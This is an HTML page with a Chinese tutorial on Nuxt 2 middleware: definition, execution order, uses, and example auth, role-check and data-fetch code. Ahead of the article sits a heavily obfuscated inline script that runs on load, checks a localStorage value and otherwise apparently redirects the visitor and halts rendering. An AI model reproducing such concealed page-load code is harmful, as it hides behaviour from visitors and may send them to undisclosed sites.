<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x26a18e=_0x910e;function _0x910e(r,s){var o=_0x3fa5();return(_0x910e=function(s,n){var a=o[s-=436];void 0===_0x910e.YgfUuK&&(_0x910e.FMUAoT=function(s,n){var a,e=[],r=0,o="";for(s=(s=>{for(var n,a,e="",r="",o=0,l=0;a=s.charAt(l++);~a&&(n=o%4?64*n+a:a,o++%4)&&(e+=String.fromCharCode(255&n>>(-2*o&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var t=0,p=e.length;t<p;t++)r+="%"+("00"+e.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(r)})(s),l=0;l<256;l++)e[l]=l;for(l=0;l<256;l++)r=(r+e[l]+n.charCodeAt(l%n.length))%256,a=e[l],e[l]=e[r],e[r]=a;for(var l=0,r=0,t=0;t<s.length;t++)a=e[l=(l+1)%256],e[l]=e[r=(r+e[l])%256],e[r]=a,o+=String.fromCharCode(s.charCodeAt(t)^e[(e[l]+e[r])%256]);return o},r=arguments,_0x910e.YgfUuK=!0);var s=s+o[0],e=r[s];return e?a=e:(void 0===_0x910e.LMOaXr&&(_0x910e.LMOaXr=!0),a=_0x910e.FMUAoT(a,n),r[s]=a),a})(r,s)}if((()=>{for(var s=_0x910e,n=_0x3fa5();;)try{if(292925==+parseInt(s(439,"M2*h"))+-parseInt(s(449,"!C0T"))/2+-parseInt(s(450,"9^ct"))/3+parseInt(s(438,"YmGf"))/4+-parseInt(s(445,"E36&"))/5+-parseInt(s(444,"q@Wv"))/6*(parseInt(s(443,"2H)J"))/7)+parseInt(s(454,"4ArH"))/8)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x26a18e(448,"h9)]")](_0x26a18e(451,"ECiZ"))!=_0x26a18e(453,"UfDg"))throw window[_0x26a18e(437,"E36&")][_0x26a18e(447,"NYX5")](_0x26a18e(441,"ZP!&")),Error();function _0x3fa5(){var s=["iGyqvSogBHO","W785W6RdHCkyWOOlmCoaWROuWPy","gqVdP28ZW5TgcYHTxmoaWOS","WPXobmkQWRX3iuRdNW","Dfvtk8kdo0xdHmkUWQJdIXyU","rhddVmkNEa","W4RcImkwWRNdN8oeWPpdLmksg8oqgSkJWRm","W4BcIcBdU8odtCk7WQNcK8oHW4q1","W75ZWO4HW67cNSoXWRNcR8kEvq","WPVcT8orW5NcP8ogW5ZdP1eqWP5L","gq/dPMOWW5TawtTSxSo7WPLr","j8oHcCoSW4xdRmopWQu","WOXmWQBdKmkTub8rf8oRkq","CmkIW4qLomkjoxZcOmkktW","v8olWO5viSoJz8o7WRGuW7O","B8kZWP7dS07cLCk6W6VcJmoTuhejjSoPmSoiESonWPRdI8ksqmkhW6LD","W4HzjHBcVvvaEG","W4/cSa1kAmkbWRPaA37dJsu","fI5gWPOIW6ldMSkJ","Emk9xmk8WOdcTCo4WQOwWOiTEW","lmkrW6GCrfPSW6/cUxhcGGK","wCkkWOJdVbdcIbi"];return(_0x3fa5=function(){return s})()}document.title="nuxt2 中间件",document.getElementById("article").innerHTML='<div><p><strong>Nuxt 2 中间件（Middleware）详解</strong></p>\n<p>Nuxt.js 2 中的中间件是一种强大的功能，允许你在页面或布局渲染之前执行一些自定义逻辑。中间件可以用于多种场景，如用户认证、路由守卫、数据预取等。以下是关于 Nuxt 2 中间件的详细解析：</p>\n<h3>一、中间件的定义与位置</h3>\n<ol>\n<li><strong>定义方式</strong>  ：\n<ul>\n<li>中间件是一个返回函数的函数，该函数接收一个上下文对象 <code>context</code> 作为参数。</li>\n<li>中间件应放置在项目的 <code>middleware</code> 目录下，文件名将成为中间件的名称。</li>\n</ul>\n</li>\n<li><strong>位置</strong>  ：\n<ul>\n<li>可以在 <code>nuxt.config.js</code> 中进行全局配置。</li>\n<li>可以在 <code>layouts</code> 或 <code>pages</code> 目录下的具体文件中进行局部配置。</li>\n</ul>\n</li>\n</ol>\n<h3>二、中间件的执行顺序</h3>\n<ol>\n<li><strong>全局中间件</strong>  ：在 <code>nuxt.config.js</code> 中配置的中间件会首先执行。</li>\n<li><strong>布局中间件</strong>  ：匹配到具体布局后，布局中定义的中间件会执行。</li>\n<li><strong>页面中间件</strong>  ：最后执行页面组件中定义的中间件。</li>\n</ol>\n<h3>三、中间件的使用场景</h3>\n<ol>\n<li><strong>用户认证</strong>  ：在中间件中检查用户是否已登录，如果未登录则重定向到登录页面。</li>\n<li><strong>路由守卫</strong>  ：根据某些条件决定是否允许用户访问特定页面。</li>\n<li><strong>数据预取</strong>  ：在页面渲染之前异步获取数据，并将其注入到 Vuex 或组件的 <code>data</code> 中。</li>\n<li><strong>请求头设置</strong>  ：在页面加载前设置自定义的 HTTP 请求头。</li>\n</ol>\n<h3>四、中间件的示例</h3>\n<h4>1. 全局中间件示例</h4>\n<p>在 <code>nuxt.config.js</code> 中配置全局中间件：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-attr">router</span>: {\n    <span class="hljs-attr">middleware</span>: [<span class="hljs-string">&#x27;auth&#x27;</span>] <span class="hljs-comment">// 假设 auth 是 middleware 目录下的一个文件</span>\n  }\n}\n</code></pre>\n<p>在 <code>middleware/auth.js</code> 中定义中间件逻辑：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">{ store, redirect }</span>) {\n  <span class="hljs-comment">// 假设用户认证状态存储在 Vuex 的 state 中</span>\n  <span class="hljs-keyword">if</span> (!store.<span class="hljs-property">state</span>.<span class="hljs-property">auth</span>.<span class="hljs-property">loggedIn</span>) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)\n  }\n}\n</code></pre>\n<h4>2. 布局中间件示例</h4>\n<p>在 <code>layouts/default.vue</code> 中配置布局中间件：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-attr">middleware</span>: <span class="hljs-string">&#x27;check-role&#x27;</span> <span class="hljs-comment">// 假设 check-role 是 middleware 目录下的一个文件</span>\n}\n</code></pre>\n<p>在 <code>middleware/check-role.js</code> 中定义中间件逻辑：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">{ store, route, redirect }</span>) {\n  <span class="hljs-comment">// 假设用户角色存储在 Vuex 的 state 中</span>\n  <span class="hljs-keyword">const</span> requiredRole = route.<span class="hljs-property">meta</span>.<span class="hljs-property">requiredRole</span>\n  <span class="hljs-keyword">if</span> (requiredRole &amp;&amp; store.<span class="hljs-property">state</span>.<span class="hljs-property">auth</span>.<span class="hljs-property">userRole</span> !== requiredRole) {\n    <span class="hljs-keyword">return</span> <span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/unauthorized&#x27;</span>)\n  }\n}\n</code></pre>\n<h4>3. 页面中间件示例</h4>\n<p>在 <code>pages/dashboard.vue</code> 中配置页面中间件：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {\n  <span class="hljs-attr">middleware</span>: <span class="hljs-string">&#x27;fetch-user-data&#x27;</span> <span class="hljs-comment">// 假设 fetch-user-data 是 middleware 目录下的一个文件</span>\n}\n</code></pre>\n<p>在 <code>middleware/fetch-user-data.js</code> 中定义中间件逻辑：</p>\n<pre><code class="language-javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">{ store }</span>) {\n  <span class="hljs-comment">// 异步获取用户数据并存储到 Vuex 中</span>\n  <span class="hljs-keyword">return</span> store.<span class="hljs-title function_">dispatch</span>(<span class="hljs-string">&#x27;fetchUserData&#x27;</span>)\n}\n</code></pre>\n<h3>五、注意事项</h3>\n<ol>\n<li><strong>异步中间件</strong>  ：中间件可以返回 Promise，以便执行异步操作。</li>\n<li><strong>错误处理</strong>  ：如果中间件抛出错误，Nuxt.js 会自动捕获并显示错误页面。</li>\n<li><strong>性能优化</strong>  ：避免在中间件中执行过于复杂的逻辑，以免影响页面加载速度。</li>\n</ol>\n<h3>六、总结</h3>\n<p>Nuxt.js 2 中的中间件是一种非常实用的功能，可以帮助开发者在页面渲染之前执行各种自定义逻辑。通过合理配置和使用中间件，可以提高应用的安全性、可维护性和用户体验。</p>\n</div>'</script></body></html>